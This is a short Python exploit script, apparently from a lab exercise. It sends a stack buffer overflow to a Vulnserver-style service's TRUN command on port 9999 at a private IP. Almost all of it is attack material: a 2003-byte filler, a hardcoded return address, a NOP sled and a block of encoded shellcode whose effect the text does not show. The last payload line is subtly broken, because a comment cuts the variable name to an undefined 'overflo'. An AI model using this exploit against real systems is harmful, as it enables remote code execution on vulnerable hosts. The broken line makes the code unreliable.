#!/usr/bin/python

import sys, socket
#b beofre quotes for byte encoding
#dont use payload.encode(),i.e the encode method,does some weird things
overflow=(b"\xdb\xc0\xbf\x0e\xce\x25\xe4\xd9\x74\x24\xf4\x5a\x31\xc9"
b"\xb1\x52\x83\xc2\x04\x31\x7a\x13\x03\x74\xdd\xc7\x11\x74"
b"\x09\x85\xda\x84\xca\xea\x53\x61\xfb\x2a\x07\xe2\xac\x9a"
b"\x43\xa6\x40\x50\x01\x52\xd2\x14\x8e\x55\x53\x92\xe8\x58"
b"\x64\x8f\xc9\xfb\xe6\xd2\x1d\xdb\xd7\x1c\x50\x1a\x1f\x40"
b"\x99\x4e\xc8\x0e\x0c\x7e\x7d\x5a\x8d\xf5\xcd\x4a\x95\xea"
b"\x86\x6d\xb4\xbd\x9d\x37\x16\x3c\x71\x4c\x1f\x26\x96\x69"
b"\xe9\xdd\x6c\x05\xe8\x37\xbd\xe6\x47\x76\x71\x15\x99\xbf"
b"\xb6\xc6\xec\xc9\xc4\x7b\xf7\x0e\xb6\xa7\x72\x94\x10\x23"
b"\x24\x70\xa0\xe0\xb3\xf3\xae\x4d\xb7\x5b\xb3\x50\x14\xd0"
b"\xcf\xd9\x9b\x36\x46\x99\xbf\x92\x02\x79\xa1\x83\xee\x2c"
b"\xde\xd3\x50\x90\x7a\x98\x7d\xc5\xf6\xc3\xe9\x2a\x3b\xfb"
b"\xe9\x24\x4c\x88\xdb\xeb\xe6\x06\x50\x63\x21\xd1\x97\x5e"
b"\x95\x4d\x66\x61\xe6\x44\xad\x35\xb6\xfe\x04\x36\x5d\xfe"
b"\xa9\xe3\xf2\xae\x05\x5c\xb3\x1e\xe6\x0c\x5b\x74\xe9\x73"
b"\x7b\x77\x23\x1c\x16\x82\xa4\xe3\x4f\xb5\x31\x8c\x8d\xc5"
b"\x28\x10\x1b\x23\x20\xb8\x4d\xfc\xdd\x21\xd4\x76\x7f\xad"
b"\xc2\xf3\xbf\x25\xe1\x04\x71\xce\x8c\x16\xe6\x3e\xdb\x44"
b"\xa1\x41\xf1\xe0\x2d\xd3\x9e\xf0\x38\xc8\x08\xa7\x6d\x3e"
b"\x41\x2d\x80\x19\xfb\x53\x59\xff\xc4\xd7\x86\x3c\xca\xd6"
b"\x4b\x78\xe8\xc8\x95\x81\xb4\xbc\x49\xd4\x62\x6a\x2c\x8e"
b"\xc4\xc4\xe6\x7d\x8f\x80\x7f\x4e\x10\xd6\x7f\x9b\xe6\x36"
b"\x31\x72\xbf\x49\xfe\x12\x37\x32\xe2\x82\xb8\xe9\xa6\xa3"
b"\x5a\x3b\xd3\x4b\xc3\xae\x5e\x16\xf4\x05\x9c\x2f\x77\xaf"
b"\x5d\xd4\x67\xda\x58\x90\x2f\x37\x11\x89\xc5\x37\x86\xaa"
b"\xcf")

shellcode=b"A"*2003 + b"\xaf\x11\x50\x62"+ b"\x90"*32 + overflo#b for byte encoding	

try:
    payload = b"TRUN /.:/" + shellcode
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.57.13',9999))
    s.send((payload))
    #s.send(("TRUN /.:/" + shellcode))
    s.close()
        
except:
    print("Error connecting to the server")
    sys.exit()	
